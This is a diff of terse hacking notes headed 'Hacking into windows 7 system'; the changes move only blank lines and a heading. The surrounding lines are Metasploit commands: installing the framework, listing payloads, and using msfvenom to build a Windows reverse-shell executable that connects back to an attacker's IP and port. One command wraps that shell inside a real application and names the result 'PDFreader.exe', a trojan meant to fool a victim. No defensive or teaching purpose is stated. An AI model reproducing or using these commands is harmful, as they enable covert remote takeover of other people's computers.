@@ -2,8 +2,9 @@
 ---Hacking into windows 7 system---
 
 
---Hacking windows 7 with & without trojan with msfconsole--
 
+
+--Hacking windows 7 with & without trojan with msfconsole--
 
 > apt install metasploit-framework
 > msfvenom -l payloads                                    (choose a payload)
@@ -28,7 +29,6 @@
 
 
 --Hacking windows 7 with & without trojan with nc--
-
 
 > msfvenom - windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
 > > msfvenom -p windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
